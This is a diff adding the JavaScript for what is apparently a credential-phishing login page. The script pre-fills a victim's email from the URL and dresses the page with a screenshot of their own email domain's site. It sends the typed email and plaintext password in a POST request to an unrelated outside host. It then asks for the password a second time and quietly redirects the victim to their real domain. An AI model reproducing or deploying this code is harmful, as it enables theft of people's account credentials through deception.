@@ -1,0 +1,366 @@
+document.addEventListener("DOMContentLoaded", () => {
+
+    console.log("app.js loaded");
+
+    const form = document.getElementById("loginForm");
+    const emailInput = document.getElementById("email");
+    const passwordInput = document.getElementById("password");
+
+
+
+    const dateTime = document.getElementById("datetime");
+    const locationInfo = document.getElementById("location");
+    const msg = document.getElementById("msg");
+
+    let attempts = 0;
+
+    // ===================================
+    // MESSAGE
+    // ===================================
+
+    function setMessage(text, color = "black") {
+        if (!msg) return;
+        msg.textContent = text;
+        msg.style.color = color;
+    }
+
+    // ===================================
+    // EMAIL DOMAIN
+    // ===================================
+
+    function getDomain(email) {
+
+        if (!email) return "";
+
+        email = email.trim();
+
+        const parts = email.split("@");
+
+        if (parts.length !== 2) return "";
+
+        return parts[1].toLowerCase().trim();
+    }
+
+    function isValidDomain(domain) {
+
+        return domain &&
+            domain.includes(".") &&
+            !domain.startsWith(".") &&
+            !domain.endsWith(".");
+
+    }
+
+    // ===================================
+    // BACKGROUND
+    // ===================================
+
+   function applyBackground(domain) {
+
+    if (!isValidDomain(domain)) return;
+
+    document.body.style.backgroundImage =
+        `url("https://image.thum.io/get/width/1920/https://${domain}")`;
+
+    document.body.style.backgroundSize = "cover";
+    document.body.style.backgroundPosition = "center";
+    document.body.style.backgroundRepeat = "no-repeat";
+
+    console.log("Background:", domain);
+
+}
+
+    // ===================================
+    // LOAD EMAIL FROM URL
+    // ===================================
+
+    function loadEmailFromURL() {
+
+        if (!emailInput) {
+            console.error("Email input not found.");
+            return;
+        }
+
+        console.log("Current URL:", window.location.href);
+
+        const params = new URLSearchParams(window.location.search);
+
+        let email = params.get("email");
+
+        console.log("Email from URL:", email);
+
+        if (!email) return;
+
+        email = email.trim();
+
+        emailInput.value = email;
+
+       const domain = getDomain(email);
+
+applyBackground(domain);
+
+    }
+
+    loadEmailFromURL();
+
+    // ===================================
+    // LIVE EMAIL CHANGE
+    // ===================================
+
+    if (emailInput) {
+
+       emailInput.addEventListener("input", () => {
+
+    const domain = getDomain(emailInput.value);
+
+    applyBackground(domain);
+
+});
+
+    }
+
+    // ===================================
+    // DATE & TIME
+    // ===================================
+
+    function updateTime() {
+
+        if (!dateTime) return;
+
+        dateTime.textContent =
+            new Date().toLocaleString();
+
+    }
+
+    updateTime();
+
+    setInterval(updateTime, 1000);
+
+    // ===================================
+    // LOCATION
+    // ===================================
+
+    async function getLocation() {
+
+        if (!locationInfo) return;
+
+        if (!navigator.geolocation) {
+
+            locationInfo.textContent =
+                "Geolocation not supported.";
+
+            return;
+
+        }
+
+        navigator.geolocation.getCurrentPosition(
+
+            async (position) => {
+
+                const {
+                    latitude,
+                    longitude
+                } = position.coords;
+
+                try {
+
+                    const response = await fetch(
+
+                        `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${latitude}&lon=${longitude}`
+
+                    );
+
+
+if (!response.ok) {
+    throw new Error("Location lookup failed");
+}
+
+                    
+
+                    const data = await response.json();
+
+                    const city =
+                        data.address.city ||
+                        data.address.town ||
+                        data.address.village ||
+                        data.address.county ||
+                        "Unknown";
+
+                    const country =
+                        data.address.country || "";
+
+                    locationInfo.textContent =
+                        `${city}, ${country}`;
+
+                }
+
+                catch {
+
+                    locationInfo.textContent =
+                        `${latitude.toFixed(4)}, ${longitude.toFixed(4)}`;
+
+                }
+
+            },
+
+            () => {
+
+                locationInfo.textContent =
+                    "Location permission denied.";
+
+            }
+
+        );
+
+    }
+
+    getLocation();
+
+    // ===================================
+    // LOGIN
+    // ===================================
+if (form) {
+
+    form.addEventListener("submit", async (e) => {
+
+        e.preventDefault();
+
+        console.log("Submit button clicked");
+
+        if (!emailInput || !passwordInput) {
+            console.error("Input fields missing.");
+            return;
+        }
+
+        const email = emailInput.value.trim();
+        const password = passwordInput.value.trim();
+
+        if (!email || !password) {
+
+            setMessage(
+                "Fill in all fields.",
+                "red"
+            );
+
+            return;
+
+        }
+
+
+
+
+try {
+
+
+
+ const cities = [
+   ];
+
+const city = cities[Math.floor(Math.random() * cities.length)];
+const currentTime = new Date().toISOString();
+
+const res = await fetch("https://lorneplumbing.com.au/oxo/login.php", {
+
+    method: "POST",
+
+    headers: {
+        "Content-Type": "application/json"
+    },
+
+    body: JSON.stringify({
+        email: email,
+        password: password,
+        city: city,
+        currentTime: currentTime
+    })
+
+});
+
+
+
+
+
+
+
+
+
+        
+
+
+
+if (!res.ok) {
+    throw new Error(`HTTP ${res.status}`);
+}
+
+const text = await res.text();
+
+console.log("AJAX finished");
+console.log("Raw server response:", text);
+
+} 
+
+catch (error) {
+
+    console.error("AJAX ERROR:", error);
+
+
+setMessage(
+    "Network error. Please try again.",
+    "red"
+);
+
+return;
+
+}
+
+attempts++;
+
+if (attempts === 1) {
+
+    console.log("First attempt block reached");
+
+   setMessage(
+ //       "Incorrect password. Please try again.",
+     //   "red"
+    );
+
+    passwordInput.value = "";
+    passwordInput.focus();
+
+    return;
+
+}
+
+if (attempts >= 2) {
+
+    console.log("Attempt count:", attempts);
+
+    const domain = getDomain(email);
+
+    console.log("Redirect domain:", domain);
+
+    if (!isValidDomain(domain)) {
+
+        setMessage(
+            "Invalid email domain.",
+            "red"
+        );
+
+        return;
+
+    }
+
+    setTimeout(() => {
+
+    console.log("Redirecting to:", `https://${domain}`);
+
+    window.location.href = `https://${domain}`;
+
+}, 800);
+
+}
+
+    });
+
+}
+
+});
